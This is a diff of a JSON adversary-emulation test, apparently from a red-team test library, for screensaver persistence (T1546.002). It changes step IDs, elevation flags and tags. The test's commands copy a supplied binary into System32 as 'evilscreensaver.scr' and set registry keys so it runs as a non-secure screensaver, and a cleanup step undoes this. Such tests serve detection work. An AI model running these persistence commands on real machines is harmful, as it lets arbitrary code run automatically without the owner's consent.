@@ -7,39 +7,39 @@
   ],
   "steps": [
     {
-      "id": "22719b41-6d2b-4173-b336-b92a32a5bf9b",
+      "id": "e67366a6-47ae-471f-a596-c304930930a1",
       "type": "execute-command",
       "data": {
         "command": "reg export \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" %userprofile%\\backup.reg\ncopy #{input_binary} \"%SystemRoot%\\System32\\evilscreensaver.scr\"\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 1 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveTimeout /t REG_SZ /d 60 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"%SystemRoot%\\System32\\evilscreensaver.scr\" /f\nif #{reboot} NEQ 0 shutdown /r /t 0\n",
         "command_type": "command_prompt"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "5761c51a-d878-4d4f-8592-0de0a53183bd",
+      "id": "5b4c558e-459a-44e4-8435-c1b18e438599",
       "type": "execute-command",
       "data": {
         "command": "reg import %userprofile%\\backup.reg\ndel %userprofile%\\backup.reg\ndel %SystemRoot%\\System32\\evilscreensaver.scr\n",
         "command_type": "command_prompt"
       },
-      "elevation_required": false
+      "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "22719b41-6d2b-4173-b336-b92a32a5bf9b",
+      "s": "e67366a6-47ae-471f-a596-c304930930a1",
       "p": "on-success",
-      "o": "5761c51a-d878-4d4f-8592-0de0a53183bd"
+      "o": "5b4c558e-459a-44e4-8435-c1b18e438599"
     },
     {
-      "s": "22719b41-6d2b-4173-b336-b92a32a5bf9b",
+      "s": "e67366a6-47ae-471f-a596-c304930930a1",
       "p": "on-failure",
-      "o": "5761c51a-d878-4d4f-8592-0de0a53183bd"
+      "o": "5b4c558e-459a-44e4-8435-c1b18e438599"
     }
   ],
   "tags": [
-    "T1546.002",
-    "atomic-red-team"
+    "T1546",
+    "T1546.002"
   ],
   "input_arguments": [
     {
